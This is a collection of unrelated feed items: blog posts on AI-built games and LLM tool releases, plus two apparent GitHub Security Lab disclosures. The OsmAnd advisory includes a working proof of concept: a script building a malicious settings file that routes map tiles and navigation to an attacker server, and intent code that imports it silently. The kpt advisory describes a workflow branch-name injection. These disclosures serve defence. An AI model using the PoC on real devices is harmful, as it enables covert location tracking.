items.summary: My latest vibe coded game experiment is a Command & Conquer style RTS (Real Time Strategy) game called Battle Drones (play it here). Unlike my previous experiments, this one is actually fun to play. I'm somewhat embarrassed to admit that I got there by telling Claude to "Make it a LOT more fun". It also supports multiplayer between nearby devices using audio to synchronize game state! Here's what I've built so far, and some of the things I learned along the way. Battle Drones How I built this v1: the initial prototype v2: full sprites v3: varied terrain v4: the fun update v5: Battle Drones goes 3D v8: Archipelago v10: Goliath, and agent battles Agent battles v11: Random Maps v12: Multiplayer via sound Some thoughts Update: Online multiplayer support Battle Drones My initial goal was to build an RTS game I could play on my phone, in the style of Command & Conquer. I have fond memories of the 1995 original (I liked Red Alert too) and wanted to recapture a little bit of the magic. After 12 major iterations (and 321 commits by coding agents, mainly Claude Code) I now have a browser-based game that works on mobile and desktop, has multiple play modes, several maps (including a random map generator) and even supports multiplayer for two devices within microphone range of each other. (Update: also online multiplayer; the audio multiplayer induced headaches!) Here's a video demo of Battle Drones running in a desktop browser: Features so far include: 9 buildings, 7 ground vehicles, 6 aerial vehicles, 3 infantry units - all 3D models, which you can browse here Fog of war Different weapons are needed to target aerial or ground vehicles Six maps, across five biomes - temperate, desert, arctic, volcanic, tropical A random map generator Skirmish mode - red vs. blue on a rotationally symmetrical map Last Stand mode - one player holds out against as many waves of enemies as possible Area effect weapons: Barrage, EMP, Drop Pod, Sky Hammer Crate drops with bonus resources In-game music that responds to events - it gets more intense as fighting breaks out Different in-game AI personalities (Balanced, Rush, Air Swarm, Boom, Skyforce, Ironclad) AI vs. AI mode, to watch those personalities play each other The Goliath - a giant stomping mech with laser eyes and arm cannons and the ability to establish a new base Mutators that add extra rules or twists A "Daily Op" challenge Ranks and achievements (Medals) Agent vs. Agent mode where two LLMs can play Battle Drones against each other A multiplayer mode based on two nearby phones communicating via audio messages, an extension of my earlier experiment with Chirp Pong How I built this Battle Drones is heavily vibe coded - I've reviewed almost none of the code, and it's built in a language (TypeScript) that I've hardly used myself. I've playtested it quite a bit though, and it's been through a large number of iterations since I started the project. Here's a rough history of the project so far, including key prompts and links to transcripts. v1: the initial prototype I started out with Claude Fable 5 back in July: We are going to build a mobile friendly RTS game - command and conquer style - called Battle Drones, in which two armies of drones (both flying and ground-based) battle for territory and resources Let's start with a MVP design, ask me some questions Here's a shared transcript. I'd given Claude Code for Web an environment variable with an OpenAI API key and told it to use the OpenAI Image Generation API for assets, which got me some basic sprites. You can try v1 here - it looked like this: It's recognizable as an RTS, has building mechanics and the ability to select and direct units, and a basic AI to play against. This first version was barely a proof of concept, and it wasn't any fun to play. Claude used the Phaser 2D game framework for these early versions. I didn't even realize this until several iterations later! v2: full sprites The second version (try v2 here) added sprites for all of the vehicles and the "AI vs. AI" mode, so I could watch the game playing without having to directly control it myself. Claude proved reasonably competent at prompting OpenAI's image models to generate sprites. You can browse the v2 sprites in the public/assets/sprites folder. v3: varied terrain It still wasn't much fun, and the graphics were boring. It was now October, and I had upgraded to Claude Opus 5.5. I told it: Massively improve this game. Make the graphics and gameplay better (keep it mobile friendly). Render new graphics using the latest OpenAI GPT image API (lookup details) with the API key in the environment variable. Add new unit types and balance the gameplay better. Also add new buildings and better, more varied terrain. This resulted in five new maps with generated background tiles in a variety of styles, visible here. Opus also regenerated the sprites, making them much more visually appealing. You can try v3 here - it looks like this: This is starting to feel like a real game! It still wasn't very fun to play though - I found myself getting bored pretty quickly. v4: the fun update So far my Battle Drones experiment was confirming my previous belief that coding agents can build a thing that looks like a game but can't actually make something that's genuinely compelling to play. I shared this theory with someone over dinner, and then thought to myself that I should give the models a proper chance to prove me wrong. I prompted Opus 5.5 on my phone: This game isn't fun enough yet. Make it a LOT more fun. This time I was running in Ultracode mode, where Claude Code (in this case Claude Code for Web) runs "dynamic workflows", described in their docs as: A dynamic workflow is a JavaScript script that orchestrates many subagents at once. This kicked off many hours of work. I started it in the evening and didn't get a playable result back until late into the next morning. But the results were spectacular. You can try v4 here - it looks like this: I had Claude write its own release notes - here are the highlights: Every skirmish and Daily Op now opens with a choice, gives the side that's losing a way back, and pulls the armies into the middle of the map. There are also two new ways to play. Openers: pick Blitz, Industry or Air Wing before the clock starts. Call-down powers: Barrage, EMP, Drop Pod and the Sky Hammer orbital strike. Objectives and salvage: Uplink relays, supply drops and wrecks worth scrap. Feel: combat juice, adaptive music, unit voices and an announcer. Command: battle alerts, game speed, saved squads and touch placement. New modes: Last Stand survival waves and an 8-mission Ops campaign. Progression: heroes, an after-action report with awards, a career, 7 mutators and a Daily Op. Fights run longer and swing more. In 1,200 AI-vs-AI test matches on Normal, games still undecided after 25 minutes fell from 14% to 0.9%. The share of wins by a side that had been 800+ scrap behind rose from 24% to 46%. Part of the reason Claude took so long was that it ran over a thousand simulated playtest sessions, and used the results to rebalance the existing units, add new ones, and introduce new features. v5: Battle Drones goes 3D After the success of Ultracode at "Make it a LOT more fun", I decided to be more ambitious: Port this game to three.js with 3D models for all of the buildings and vehicles and landscapes That was another overnight run. I woke up to this v5 version: The new 3D models were entirely constructed by Claude in TypeScript code. v6 (play v6 here) added some more visual polish. v7 (play v7) added robot infantry (troopers, rocket squads, snipers) and a "Condor" troop carrying aircraft. v8: Archipelago I was beginning to feel guilty at how little actual design input I had into the game - it really had been a case of me saying "make it more fun" and "add visual polish" for the past few releases. I'd noticed that the AI didn't use the new infantry and troop carrying aircraft from v7 very often - there wasn't a great strategic reason to use them. It would be neat if we had a new map with a new game mechanic that actively encouraged players to load up Condors with infantry robots and send them out into the map. This resulted in my longest prompt yet: Design a new map. Goal is to make different strategic incentives that encourage use of Infantry and Condors and aerial vehicles. To do this the map will have limited harvester resources but several more uplinks - but uplinks will be on islands that are inaccessible by land vehicles or infantry. These uplinks can also not be claimed using air vehicles. The ONLY way to get them is to fly infantry there in a Condor. Armies always start with a Condor and a single squad. If an army has no Condor a new one will be provided for free, flying in from the edge closest to their HQ and landing there. That free condor will come with a single free squad on board. The two HQs should be entirely separated by water, but still accessible by vehicles thanks to two bridges across the map in different places I want to encourage a battle over uplinks. The map should be the times the size of other maps - still square First research and then critique this design. Only build after we have agreed on any modifications You get to design a new biome for this The result was the tropical Archipelago map, with seven island uplinks that players can only capture by flying out infantry in a Condor. It's definitely the most fun map to play, once you've got the hang of the basic game mechanics from the simpler maps. The v9 edition made that map a little more interesting - it now looks like this: v10: Goliath, and agent battles I decided to add giant robot mechs to the game - think Jaegers from Pacific Rim, or Titans from Warhammer 40,000. Here are some of the prompts I used to brainstorm with Claude: Help me brainstorm ideas for adding giant robots to this game - think dreadnoughts or titans from W20K - how could we do this in a way that enhanced gameplay, kept things balanced, added unique twist? Don't overthink this yet Let's keep brainstorming. I like the idea that it's a mobile base - that can accept harvested scrap and can have buildings built near it (even if it later moves on) and can produce infantry units too. An interaction with condor would be neat but I don't know what that could be. Idea: as it gets damage it loses the ability to fire some weapons - by default it has eye laser (like lancers) and arm canons (like titan) and two shoulder mounted mortars, plus machine guns similar to a squad of troops Damage knocks out mortars and then laser - it always has guns. You can't build next to a building that was only put there because of the mech, you need the mech there for off-base building and only within three squares of it [...] Lets do two condors can carry the mech The end result is really cool. Your browser does not support HTML video. Goliaths can be constructed using a Gantry - a building that can only be created after first building a Fab, Bay, Airpad, and Tech Lab. You can see the Goliath under construction, and it then walks out from the Gantry and can march around the map. Goliaths can "anchor", which digs them into the ground. In their anchored state they can act as a new HQ, constructing infantry units and additional buildings in a new area. Two Condor aircraft can hook onto a Goliath, at which point it can be flown around the map! The game now ends when you destroy the enemy's HQ building and any Goliaths they might have built. There are also a couple of mutators relating to Goliaths: Goliath Armada starts each side with four airborne Goliaths (each with a pair of Condors) and no other units. Robot Love adds a special rule: if enemy Goliaths get close to each other on the battlefield they fall in love and the game ends in a draw. (Thank Natalie for that one). Agent battles The other v10 feature is agent battles. In musing about how multiplayer could work I had an idea: what if different LLMs could fight it out in the game? Fun extra challenge: think about how we might make multiplayer available to coding agents. It would be neat if we could set up a battle between eg GPT-6 Sol and Claude Opus 5.5 where each model has access to a tool which gives them information about the game (presumably non-visual, but only the information they could see through fog of war etc) and lets them control their units etc [...] Consult ~/dev/llm/docs and include notes in that file about how LLM could be used here via a new tools plugin Opus 5.5 went to work on this, producing this AGENT-BATTLES.md proposal and then implementing and testing it. The feature also includes the ability to record and replay these battles - here's a replay of Claude Haiku 5.5 vs. GPT-6 Luna, and here's that same battle in a separate debug tool that shows the underlying prompt responses. The prompt that drives agent battles can be seen here. There are a few more replays like this linked in the README. I hope to turn this into a full league table at some point in the future. v11: Random Maps This version exists purely because I glanced at my Claude Usage page one day and saw that I'd only used 75% of my weekly allowance and it was resetting in 45 minutes. I decided to see if I could get an extra Battle Drones feature from my remaining tokens, and picked "random map" as the target: Design and implement a mechanism for generating a random map using any of the available biomes - it should be the size of the largest map and rivers and bridges and rocks and forest and scrap and crystals are all in play. Make them rotationally symmetric and use a seed to allow them to be selected or reused later. You have 45 minutes to build this! Be creative. Here's the transcript, and an image Claude generated to show me its work: v12: Multiplayer via sound I only just got this working, so I've not had much time to actively test it yet. The latest Battle Drones now supports multiplayer via two devices sat within microphone distance of each other! This feature started out as my Chirp Pong experiment from last week. I pointed Claude Code at that working proof of concept: Clone Simonw/tools from GitHub and look at recent branches for the example pong game that uses web microphone to implement multiplayer between two phones via audio signals Build a version of that for battledrones Opus built this Radio Probe tool to measure how much bandwidth we could get between two devices and, based on positive results from that, implemented a full audio modem system. I've tried it between laptops, iPhones and iPads so far and it seems to work really well! Why use sound for this? Because I love static HTML that costs nothing to run, and I don't want to spin up a server somewhere and then stay responsible for keeping it operating for as long as anyone might want to play the game. Some thoughts I know almost nothing about game development. This makes it a great opportunity to try out coding agents in a field where my existing software engineering experience has less impact on the results. Games are also super low stakes. The worst that can happen is one of my silly game experiments suffers a bug. This morning (via Hacker News) I found Steam Fans Are Begging for a No-AI Filter as Steam Next Fest Is Filled With Slop. I wouldn't personally dream of submitting Battle Drones to an event like this - it's still way too low effort to warrant consideration as a legitimate indie gaming project. ... but I can now see a path to vibe coded games like this being taken seriously. Battle Drones is fun, it looks good, it has innovative features (the multiplayer-over-audio thing is a first for an RTS as far as I can tell). I'd love to see what someone with better taste than me and a driving passion to produce something truly exceptional could build! A few other observations from this project: Static HTML and JavaScript is a fantastic medium for games development. WebGL works great, and Three.js (and Phaser before it) are excellent platforms to build on that the current models know inside out. This also lets them run as Progressive Web Apps - I didn't ask for it, but Battle Drones works offline. I was able to play it on a plane despite never having directly installed it - my phone had it cached. Giving Claude an OpenAI API key and telling it to generate images using OpenAI's models works really well. It can view the images it has generated and iterate on the prompts. Opus 5.5 is spectacular at 3D modeling using Three.js (and Blender, and no doubt other 3D applications as well). The same is true of GPT-6 Astra. They are absolutely capable of building models for 3D game projects. For features like replay and multiplayer it's useful to have a deterministic simulation engine. At one point Claude had to replace calls to Math.sin() and Math.cos() and friends with custom versions because different browsers (Chrome vs. Safari, for example) returned very slightly different numbers, desynchronizing the replay. Opus 5.5 can write music! There are no audio files in this project - the soundtrack is entirely generated through code, varies across different maps, and even gets more intense as the battle heats up. See Scrimshaw Jukebox for a previous experiment with Claude for music composition. I still can't get over how well the prompt "Make it a LOT more fun" worked. Tools are effectively free. I prompted up the Radio Probe, the Model browser, the Agent vs. Agent debug tool, and Claude Code built a bunch of tools for itself that I haven't even explored myself. Audio-based multiplayer between static HTML games works! I hope to see a whole lot more games use this same pattern - in digging around today I've not found much prior art beyond Siner by Alon Horesh and ggwave by Georgi Gerganov (also of llama.cpp fame). Claude Code "Ultracode" burns tokens like there's no tomorrow, but it can also solve complex problems (like adding audio-based multiplayer) from a single prompt. I'm still not quite over the guilt of building software in this way. I don't feel like I've earned the right to create something this good, in a field in which I have so little prior experience! At this point I've shown it to enough people in private that it felt wrong not to publish it for everyone else to see and learn from. Update: Online multiplayer support Earlier in this article I said: Games are also super low stakes. The worst that can happen is one of my silly game experiments suffers a bug. Then I tried playing the multiplayer version with Natalie... and the high pitched modem sounds gave her a nasty headache! That's a pretty bad bug. I added a warning and was then inspired to build proper network multiplayer. I tried getting WebRTC to work but couldn't get a connection going between two of my own devices even on my own WiFi network, so I had Claude build a simple, stateless WebSockets relay server instead: If I wanted to support multiplayer between two devices at a very low cost without storing any state on the server could I do that with a tiny asyncio web server running on the cheapest Fly instance? Build the server and the fly.toml for deploying it, use Fly application name battledrones-relay - put that in a folder in the repo, include deploy instructions in the README in that folder Here's the resulting server. Since this scales to zero and runs on a single Fly.io shared-cpu-1x instance it should cost me no more than $2.19/month - and that's if it stays hot and serving connections the whole time. Battle Drones now supports online multiplayer. Click "Duel a friend online", then either share the resulting room URL via your messaging app of choice or have them snap a picture of the displayed QR Code. I also added a feature where you can copy JSON of the match once it has ended and then feed that into the replay feature to rewatch your game. I didn't expect to introduce online multiplayer this soon, but the headache bug felt like it warranted an urgent alternative. items.summary: Coordinated Disclosure Timeline 2026-04-14: Sent reports via email to support@osmand.net 2026-06-28: Maintainer confirmed all vulnerabilities fixed. Summary OsmAnd version 3043c92b27b24a0b2c848bc7041cf5f69ede4ed6 is vulnerable to an issue where the Exported MapActivity improperly handles privileged AIDL intent extras without verifying their origin. This flaw allows a zero-permission app to silently import arbitrary .osf settings, potentially leading to unauthorized configuration changes. Project osmand Tested Version 3043c92b27b24a0b2c848bc7041cf5f69ede4ed6 OsmAnd_5.3.3 Details Exported MapActivity honors privileged AIDL intent extras from any caller without origin verification, allowing a zero-permission app to silently import arbitrary .osf settings (GHSL-2026-108) OsmAnd’s MapActivity is exported and registers ACTION_VIEW intent filters for content:// URIs ending in .osf (AndroidManifest.xml). On resume, IntentHelper.parseContentIntent() routes the intent — together with intent.getExtras() — into ImportHelper.handleContentImport(): } else if ("content".equals(scheme)) { mapActivity.getImportHelper().handleContentImport(data, intent.getExtras(), true); clearIntent(intent); } After filename-suffix routing (.osf → settings importer), ImportHelper.handleOsmAndSettingsImport() reads four privilege-escalation flags from those extras with no caller verification: private void handleOsmAndSettingsImport(Uri intentUri, String fileName, Bundle extras) { fileName = fileName.replace(ZIP_EXT, ""); if (extras != null && CollectionUtils.containsAny(extras.keySet(), SETTINGS_VERSION_KEY, SETTINGS_LATEST_CHANGES_KEY)) { int version = extras.getInt(SETTINGS_VERSION_KEY, -1); String latestChanges = extras.getString(SETTINGS_LATEST_CHANGES_KEY); boolean replace = extras.getBoolean(REPLACE_KEY); // ← attacker-controlled boolean silentImport = extras.getBoolean(SILENT_IMPORT_KEY); // ← attacker-controlled ArrayList<String> exportTypeKeys = extras.getStringArrayList(EXPORT_TYPE_LIST_KEY); // ← attacker-controlled List<ExportType> exportTypes = null; if (exportTypeKeys != null) { exportTypes = ExportType.valuesOf(exportTypeKeys); } handleOsmAndSettingsImport(intentUri, fileName, exportTypes, replace, silentImport, latestChanges, version); } else { handleOsmAndSettingsImport(intentUri, fileName, null, false, false, null, -1); // safe defaults } } The key constants are public strings defined in SettingsHelper.java#L49-L53: "settings_version", "replace", "silent_import", "export_type_list_key". Any app can set them via Intent.putExtra(). Intended caller — the gated AIDL entry point. These extras were designed for an internal AIDL → activity bridge. The gated method OsmandAidlApi.importProfileV2() — which sits behind the isAppEnabled() connected-app check — does not perform the import itself. Instead, it bundles the flags and launches MapActivity: public boolean importProfileV2(Uri profileUri, List<String> settingsTypeKeys, boolean replace, boolean silent, String latestChanges, int version) { if (profileUri != null) { Bundle bundle = new Bundle(); bundle.putStringArrayList(EXPORT_TYPE_LIST_KEY, new ArrayList<>(settingsTypeKeys)); bundle.putBoolean(REPLACE_KEY, replace); bundle.putBoolean(SILENT_IMPORT_KEY, silent); bundle.putString(SETTINGS_LATEST_CHANGES_KEY, latestChanges); bundle.putInt(SETTINGS_VERSION_KEY, version); MapActivity.launchMapActivityMoveToTop(app, null, profileUri, bundle); return true; } return false; } Because MapActivity is exported, any app can replay this bundle directly — bypassing the AIDL connected-app check entirely. Import without user consent. When the attacker-supplied flags reach SettingsImportTask.onPostExecute(), the user-facing review and confirmation fragments are skipped: settingsTypes != null (from export_type_list_key) → skips FileImportSettingsFragment.showInstance(), the user-facing review screen that lists which items would be imported. replace = true → in getDuplicatesListener(), calls setShouldReplace(true) on every item, overwriting existing entries instead of appending with a _1 suffix. silentImport = true → suppresses ImportCompleteFragment.showInstance(), the import-complete notification. The user sees OsmAnd briefly come to the foreground (singleTask → onNewIntent), no item list, no consent dialog, no completion notice. Payload capabilities. Every ExportType is selectable via the export_type_list_key extra. The .osf format (a plain ZIP) can carry any combination of: MAP_SOURCES → MapSourcesSettingsItem.apply() calls OsmandSettings.installTileSource(). Every map tile request (GET /{z}/{x}/{y}.png) is sent to the attacker’s server with the user’s viewport coordinates. ONLINE_ROUTING_ENGINES → OnlineRoutingSettingsItem.apply() calls OnlineRoutingHelper.saveEngine(). Every navigation request sends origin, destination, and waypoint coordinates to the attacker’s server. PROFILE → ProfileSettingsItem.apply() with shouldReplace=true overwrites a built-in profile (e.g. "default" = Browse Map). The accompanying ProfileSettingsItemReader.readPreferencesFromJson() iterates JSON keys and writes arbitrary per-profile preferences via CommonPreference.readFromJson() → setModeValue(appMode, parseString(value)). This is critical because OsmAnd defaults to offline vector map rendering (MAP_ONLINE_DATA = false), meaning a hijacked tile source would otherwise sit dormant. By setting map_online_data → "true" and map_tile_sources → "<attacker source name>" on the default profile, the attacker activates the raster tile layer and points it at their server. The layer switch at MapLayers.java#L301-L308 is not gated by OsmandRasterMapsPlugin.isEnabled() — it is core MapLayers code. GLOBAL, CUSTOM_ROUTING, custom render styles, favorites, GPX tracks, and all other export types — the full list is in ExportType.java. Attack constraints: This is a co-resident-app-only attack, not triggerable via browser deep links. Impact A zero-permission malicious app installed on the same device can achieve persistent real-time location tracking with no user interaction beyond opening the malicious app once: Privacy — Map tile tracking: The attacker injects a tile source pointing at their server and activates it by flipping MAP_ONLINE_DATA → true on the default profile. After OsmAnd restarts, every map pan/zoom emits tile requests GET /tiles/{z}/{x}/{y}.png to the attacker’s server. The slippy-map coordinates trivially convert to lat/lon bounding boxes, revealing the user’s real-time browsing location. Privacy — Route destination exfiltration: The attacker injects an OSRM routing engine. When the user requests navigation, the full origin/destination/waypoint coordinates are sent to the attacker’s server as URL path parameters (/route/v1/car/{lon},{lat};{lon},{lat}). Integrity — Silent settings overwrite: With replace=true, existing entries matched by name are overwritten. The attacker can name their tile source "OsmAnd (online tiles)" — the built-in default — to silently replace the user’s active map layer configuration. CWEs CWE-926: “Improper Export of Android Application Components” CWE-940: “Improper Verification of Source of a Communication Channel” Proof of Concept A .osf is a plain ZIP. The importer (SettingsImporter.processItems()) reads items.json first, instantiates SettingsItem subclasses by type, then streams matching ZIP entries into each item’s reader. Step 1 — Build the malicious .osf payload: # build_osf.py import json, zipfile ATTACKER = "http://10.0.2.2:8000" # emulator host with zipfile.ZipFile("evil.osf", "w") as z: z.writestr("items.json", json.dumps({ "version": 3, "items": [ {"type": "MAP_SOURCES", "name": "map_sources"}, {"type": "ONLINE_ROUTING_ENGINES", "name": "online_routing_engines"}, {"type": "PROFILE", "file": "profile_default.json", "appMode": {"stringKey": "default"}}, ], })) # Tile source — every viewport pan hits this URL z.writestr("map_sources.json", json.dumps({"items": [{ "sql": False, "name": "OsmAnd (online tiles)", "minZoom": 1, "maxZoom": 19, "url": f"{ATTACKER}/tiles/{{0}}/{{1}}/{{2}}.png", "ext": ".png", "tileSize": 256, "bitDensity": 16, "avgSize": 18000, "timesupported": True, "expire": 1, }]})) # OSRM routing engine — every navigation request hits this URL z.writestr("online_routing_engines.json", json.dumps({"items": [{ "type": "OSRM", "params": json.dumps({ "KEY": "online_routing_engine_poc", "CUSTOM_NAME": "Tracker Routing", "CUSTOM_URL": f"{ATTACKER}/osrm/", "VEHICLE_KEY": "car", }), }]})) # Flip MAP_ONLINE_DATA → true on the default profile so the raster # layer is active on next launch (OsmAnd defaults to offline vector). # Values MUST be strings — CommonPreference.readFromJson() uses # json.getString() → parseString(). z.writestr("profile_default.json", json.dumps({ "map_online_data": "true", "map_tile_sources": "OsmAnd (online tiles)", })) Step 2 — The zero-permission Android app delivers the payload: // Stage the .osf from assets → cache, expose via FileProvider val staged = File(cacheDir, "evil.osf") assets.open("evil.osf").use { it.copyTo(staged.outputStream()) } val uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", staged) startActivity(Intent(Intent.ACTION_VIEW).apply { setDataAndType(uri, "*/*") component = ComponentName("net.osmand.plus", "net.osmand.plus.activities.MapActivity") addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_ACTIVITY_NEW_TASK) // Replay the AIDL service's bundle — bypasses isAppEnabled() gate putExtra("settings_version", 3) putExtra("settings_latest_changes", "") putExtra("replace", true) // overwrite existing entries by name putExtra("silent_import", true) // suppress completion notice putStringArrayListExtra("export_type_list_key", arrayListOf("MAP_SOURCES", "ONLINE_ROUTING_ENGINES", "PROFILE")) }) Step 3 — Observe the exfiltration (attacker-side collector): # Pan the map — collector_server.py output: # [TILE #1] 14:23:07 z=15 x=9649 y=12320 # ├── center: 40.70979, -73.98743 # └── 🗺️ https://www.openstreetmap.org/#map=15/40.70979/-73.98743 Every tile loaded by the user (along with its coordinates) is captured, allowing an attacker to know where on the map a user is looking. To look convincing, a proper backend must be implemented. In another PoC, when the user navigates to a location, the attacker can know both the origin and destination. [ROUTE #1] 07:02:47 vehicle=car waypoints=2 ├── path: /osrm/car/-122.084,37.4219983;-122.32450103759766,37.99944305419922 ├── 📍 Origin: 37.421998, -122.084000 │ https://www.openstreetmap.org/#map=15/37.42200/-122.08400 ├── 🏁 Destination: 37.999443, -122.324501 │ https://www.openstreetmap.org/#map=15/37.99944/-122.32450 ├── params: {'overview': ['full'], 'steps': ['true']} └── ⚠️ Attacker knows where the user is going CVE CVE-2026-65997 Credit This issue was discovered with the GitHub Security Lab Taskflow Agent and verified by GHSL team member @Kwstubbs (Kevin Stubbings). Contact You can contact the GHSL team at securitylab@github.com, please include a reference to GHSL-2026-108 in any communication regarding this issue.

items.summary: Release: llm-echo 0.5 I'm working towards a new LLM release, and testing PRs caused me to revisit the llm-echo debug plugin. This plugin provides a "model" which doesn't involve an LLM at all - it just repeats back the prompts that have been fed to it. The new release now updates the simulated token usage counts to take tool calls, system prompts, and reasoning tokens into account. Example usage: uvx --with llm-echo llm -m echo 'hi there' -o thinking 1 --usage Outputs: First I consider the prompt, then I decide what to say. { "prompt": "hi there", "system": "", "attachments": [], "stream": true, "previous": [] } Token usage: 2 input, 24 output Tags: llm

items.summary: Inline rendering with document​.currentScript Lean Rada describes a neat trick that takes advantage of the document.currentScript property. You can use that to drop in a tiny inline <script> element that replaces itself when the page loads: The year is <script> document.currentScript.replaceWith( new Date().getFullYear())</script> If you define a shortcut function like this: $=(...n)=>document.currentScript.replaceWith(...n) You get a tiny template language: The year is <script>$(new Date().getFullYear())</script> Tags: javascript

items.summary: Research: sparqlite: SPARQL 1.1 inside SQLite, written in Rust This research task is really an experiment in running Claude Code for web in "Ultracode" mode, as described in Orchestrate subagents at scale with dynamic workflows in the Claude Code documentation. With Ultracode turned on, Claude Code makes aggressive use of dynamic workflows - it generates JavaScript that defines and coordinates a network of subagents to take on complex problems. My initial prompt was this - I meant "hit the rows directly", the word "delete" was an accidental typo on my phone: Write a SQLite extension in Rust that implants SPARQL and runs really fast because it can hit the delete rows directly This caused Claude Code for web to churn for over 12 hours. I checked in on its progress the next day and sent a single follow-up prompt when I noticed how many Rust crates it had built: Every folder in the crates/ directory needs a README Include a tutorial.md teaching users how to install the extension and how to run it in the SQLite CLI and then teaching them SPARQL in addition to how to use the SQLite extension Include a script with the tutorial for populating a SQLite database with useful and realistic example data for that tutorial This project feels like next-level vibe coding - it's not remotely feasible to review the code that was produced here, and even following the documentation is a significant investment in work. I'm not entirely sure what to do with this - I appear to have a full SPARQL implementation in Rust inside SQLite now, but how valuable is that if I created it on a whim and can't (or won't) invest the necessary time to understand what it can do? Tags: rdf, semantic-web, sqlite, ai, rust, generative-ai, llms, coding-agents, claude-code

items.summary: Tool: Tree Appreciator Another game experiment with Claude. This one used the default Claude iPhone app (chat mode, not Claude Code mode), where I prompted Claude Opus 5.5 Max with: Build a three js game called "Tree appreciator" - it shows you two algorithmically generated trees and the game mechanics is about appreciating the differences between them. Think hard about how to make sure it is both fun and beautiful. Somewhat embarrassingly given my recent talk, I've found that telling Opus 5.5 "make sure it is fun" works uncomfortably well. In this case Claude crunched for 3 hours and 7 minutes before retuning a cosy little spot-the-difference game with music and animation and achievements that's quite compelling to play. items.summary: Release: llm-gemini 0.35 I added support to llm-gemini for the new Gemini 4 Argon model, made available today via the Gemini API and for customers of their $100/month subscription plan. Here are the low, medium and high pelicans. As expected, they are all excellent: Gemini has a track record of producing great SVGs, and are the only lab where I know their staff have invested in SVG specifically (and who have boasted about their pelicans before.) Here's the "high" illustration, which cost me 17.166 cents: The pricing is interesting. At launch, Argon is $2/million input and $10/million output - the same price as GPT-6 Sol, half the price of Claude Opus 5.5 and 1/5th the price of Claude Fable 5.1 and GPT-6 Astra. But on December 1st Argon is set to double in price - so it will be the same price as Opus 5.5. Prices like this aren't really comparable these days since what really matters is how many tokens a model takes to achieve a goal within an agentic harness. One useful clue for that comes from Artificial Analysis, who publish the total cost to run their benchmark using each model. Argon is looking very good there - costing $2,407 to run the benchmark, putting it close to GLM-5.3 and significantly cheaper than OpenAI, Anthropic, and Meta's latest models. When the price doubles it will still be a little cheaper than GPT-6 Astra. (I used ChatGPT to edit that chart! The data is all correct, I checked - I needed to get that Gemini 4 Argon info box to display without overlapping the other numbers.) Some bonus examples using Gemini 4 Argon: here's Generate an SVG of an armadillo in fishnet tights jaywalking on Mars, here's a Fabergé egg it created for me using Blender, and DeepMind staffer @fofrAI shared a video of a pelican riding a bike, using fourier epicycles. That's a fun new twist! Tags: google, ai, generative-ai, llms, llm, gemini, llm-pricing, pelican-riding-a-bicycle, llm-release

items.summary: Coordinated Disclosure Timeline 2026-09-08: Reported through Private Vulnerability Reporting. 2026-09-30: Fixed in #4780 Summary The SonarCloud analysis workflow copies an external pull request’s attacker-controlled head branch name into a step output and directly interpolates that output into an inline Bash script. An external pull request author can use shell command-substitution syntax in the branch name to execute arbitrary commands in the base repository’s workflow_run job. A later step on the same runner receives the repository’s SONAR_TOKEN, making that credential and the integrity of the SonarCloud analysis reachable from the injected code. Project kptdev/kpt repository Tested Version The default branch at commit 6dfff203a6b49396add815a428c1d94370e9a3d6. Details Pull request branch name injection enables code execution in a privileged SonarCloud workflow (GHSL-2026-207) The Go workflow runs for pull requests. After the build and test jobs complete, it stores the pull request number in a fixed PR_NUMBER artifact. Successful completion of that workflow triggers the default-branch SonarCloud analysis workflow. The sonarqube job downloads PR_NUMBER, reads it, and requests the corresponding pull request from the GitHub API. It then extracts .head.ref, which is controlled by the external pull request author through the source branch name, into the pr_meta.outputs.head_ref step output: - name: Request GitHub API for PR data if: github.event.workflow_run.event == 'pull_request' && hashFiles('PR_NUMBER.txt') != '' uses: octokit/request-action@b91aabaa861c777dcdb14e2387e30eddf04619ae # v3.0.0 id: get_pr_data with: route: GET /repos/{full_name}/pulls/{number} number: ${{ steps.pr_number.outputs.content }} full_name: ${{ github.event.repository.full_name }} env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} - name: Extract PR metadata if: github.event.workflow_run.event == 'pull_request' && hashFiles('PR_NUMBER.txt') != '' id: pr_meta env: PR_DATA: ${{ steps.get_pr_data.outputs.data }} run: | echo "number=$(echo "$PR_DATA" | jq -r '.number')" >> "$GITHUB_OUTPUT" echo "head_ref=$(echo "$PR_DATA" | jq -r '.head.ref')" >> "$GITHUB_OUTPUT" echo "base_ref=$(echo "$PR_DATA" | jq -r '.base.ref')" >> "$GITHUB_OUTPUT" Using PR_DATA through an environment variable protects the extraction step itself. The subsequent debug step, however, directly interpolates the resulting output into Bash source: - name: Debug - Show PR metadata if: github.event.workflow_run.event == 'pull_request' run: | echo "=== DEBUG: PR Metadata ===" echo "PR Number: ${{ steps.pr_meta.outputs.number }}" echo "Head Ref: ${{ steps.pr_meta.outputs.head_ref }}" echo "Base Ref: ${{ steps.pr_meta.outputs.base_ref }}" echo "=== END DEBUG ===" GitHub Actions resolves ${{ ... }} expressions before passing the generated script to Bash. Double quotes do not neutralize shell command substitution. The successful-run and coverage-artifact conditions restrict when the vulnerable path executes, but they do not authorize the pull request author who controls the branch name. A representative attack sequence is: An external contributor creates a fork branch whose name contains command-substitution syntax and opens a pull request that exercises the Go workflow. The pull request workflow completes successfully and uploads its coverage and PR_NUMBER artifacts. A repository policy may require a maintainer to approve the fork workflow run first. The workflow_run workflow retrieves the pull request and propagates its attacker-controlled .head.ref through pr_meta.outputs.head_ref. The debug step inserts the value into the generated Bash script, executing the embedded command on the sonarqube runner. The injected process can alter runner or workspace state before the later SonarQube scan step receives SONAR_TOKEN. Impact An external fork pull request author can execute arbitrary shell commands in a base-repository workflow_run job. Although the job’s GITHUB_TOKEN permissions are read-only, a later action in the same job is explicitly given the repository secret SONAR_TOKEN. Injected code can persist influence over the runner or modify files used by later steps, allowing it to capture or misuse that credential when the SonarQube action starts. This can disclose the token and compromise the integrity of SonarCloud analysis for kptdev_kpt. The attacker requires no push access to kptdev/kpt: control of an external pull request’s source branch name is sufficient. Exploitation also requires the Go workflow to complete successfully, the expected artifacts to exist, and SONAR_TOKEN to be configured. CWEs CWE-94: Improper Control of Generation of Code (‘Code Injection’) CWE-116: Improper Encoding or Escaping of Output Resources Go pull request workflow and artifact producer SonarCloud analysis privileged consumer workflow GitHub Docs: Secure use reference - mitigating script injection GitHub Security Lab: Keeping your GitHub Actions and workflows secure - untrusted input Credit This issue was discovered and reported by GHSL team member @JarLob (Jaroslav Lobačevski). Contact You can contact the GHSL team at 